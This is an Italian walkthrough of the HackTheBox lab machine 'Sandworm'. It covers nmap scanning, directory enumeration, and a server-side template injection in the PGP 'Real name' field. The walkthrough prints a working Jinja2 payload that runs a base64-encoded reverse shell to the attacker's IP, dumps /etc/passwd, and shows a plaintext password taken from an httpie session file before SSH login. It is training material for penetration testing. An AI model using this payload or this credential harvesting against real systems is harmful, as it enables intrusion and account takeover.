# Sandworm

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.11.218
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.11.218
Host is up (0.039s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=10/25%OT=22%CT=1%CU=38585%PV=Y%DS=2%DC=I%G=Y%TM=653926
OS:42%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
OS:11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)EC
OS:N(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Aggiungo _ssa.htb_ al file _/etc/hosts_ e passo alla fase successiva.

## Enumeration

Innanzitutto, visito la pagina https://ssa.htb/:

<p align="center">
  <img src="/Immagini/Linux-Box/Sandworm/sandworm-1.png" />
</p>

Controllo il certificato della pagina e scopro la seguente email: _atlas@ssa.htb_:

<p align="center">
  <img src="/Immagini/Linux-Box/Sandworm/sandworm-2.png" />
</p>

Scopro inoltre che il sito è gestito dal micro-framework _Flask_ scritto in Python.

Eseguo il comando _dirsearch_:

```text
dirsearch -u https://ssa.htb/
```

Ottengo il seguente risultato:

```text
Target: https://ssa.htb/

[10:35:51] Starting:
[10:36:01] 200 -    5KB - /about
[10:36:03] 302 -  227B  - /admin  ->  /login?next=%2Fadmin
[10:36:18] 200 -    3KB - /contact
[10:36:25] 200 -    9KB - /guide
[10:36:32] 200 -    4KB - /login
[10:36:32] 302 -  229B  - /logout  ->  /login?next=%2Flogout

Task Completed
```

Quindi controllo ogni pagina:
  * _/about_:
    * Qui è presente una spiegazione relativa all'SSA (Secret Spy Agency): La SSA è responsabile di fornire informazioni di intelligence basate su segnalazioni (SIGINT) a leader politici e militari per garantire la sicurezza nazionale.
  * _/contact_:
    * In questa pagina è presente la possibilità di inviare un consiglio criptato attraverso PGP.
  * _/guide_ (INTERESSANTE):
    * Qui invece viene fornita una dimostrazione pratica di come funziona PGP.
    * Viene fornita anche la chiave pubblica.
    * <p align="center">
      <img src="/Immagini/Linux-Box/Sandworm/sandworm-3.png" />
    </p>
  * _/login_:
    * Semplice pagina di login.


La pagina più interessante, ovvero https://ssa.htb/guide, presenta nella parte finale due campi, dove bisogna inserire una chiave e un testo per verificare la firma.

Quindi mi focalizzo su questa sezione della pagina.


## Exploitation

Dopo alcune ricerche trovo [questo](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

Quindi genero una chiave _gpg_ attraverso il seguente comando:

```text
gpg --gen-key
```

Nella guida precedente scopro che il campo _Real name_ è vulnerabile all'SSTI (Server Side Template Injection). Quindi inserisco il payload {{7*7}} all'interno del campo. Se dovesse risultare vulnerabile darebbe il numero 49 come output relativo al nome.

<p align="center">
  <img src="/Immagini/Linux-Box/Sandworm/sandworm-4.png" />
</p>

Successivamente, genero una chiave attraverso l'utilizzo del seguente comando:

```text
gpg -a -o public.key --export {{7*7}}
```

Poi creo la chiave per criptare il messaggio che bisognerà inserire nel campo "Signed Text" del form della pagina https://ssa.htb/guide:

```text
echo 'prova' | gpg --clear-sign
```

Quindi ora che ho sia la **Public Key** che il **Signed Text**, li inserisco all'interno dei campi della pagina e premo sul pulsante "Verify Signature":

<p align="center">
  <img src="/Immagini/Linux-Box/Sandworm/sandworm-6.png" />
</p>

**Il numero 49 all'interno del output mi conferma la presenza della vulnerabilità!**

Elimino quindi le chiavi create precedentemente:

```text
gpg --delete-secret-keys prova@prova.com
```

```text
gpg --delete-keys prova@prova.com
```

E procedo generandole nuovamente, ma questa volta seguendo questa [guida](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) per cercare di ricavare una reverse shell.

Quindi tramite il tool [Reverse Shell Generator](https://www.revshells.com/) genero del codice in base64:

<p align="center">
  <img src="/Immagini/Linux-Box/Sandworm/sandworm-7.png" />
</p>

Successivamente, genero il payload da utilizzare per creare la reverse shell:

```text
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC85OTk5IDA+JjE=" | base64 -d | bash').read() }}
```

Quindi rieseguo la procedura di creazione, carico i testi e, prima di premere su "Verify Signature", avvio un listener sulla porta 9999:

<p align="center">
  <img src="/Immagini/Linux-Box/Sandworm/sandworm-8.png" />
</p>

**Sono dentro!**

Purtroppo però non è presente alcuna flag.

## Privilege Escalation

Controllo il file _/etc/passwd/_:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
silentobserver:x:1001:1001::/home/silentobserver:/bin/bash
atlas:x:1000:1000::/home/atlas:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

Noto la presenza dell'utente _silentobserver_.

Dopo aver perso un po di tempo ad ispezionare le varie cartelle, scopro che nel file _/home/atlas/.config/httpie/sessions/localhost_5000/admin.json_ sono presenti le credenziali dell'utente _silentobserver_:


```text
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```

**Quindi accedo tramite ssh e ottengo il primo flag!**

<p align="center">
  <img src="/Immagini/Linux-Box/Sandworm/sandworm-9.png" />
</p>

...
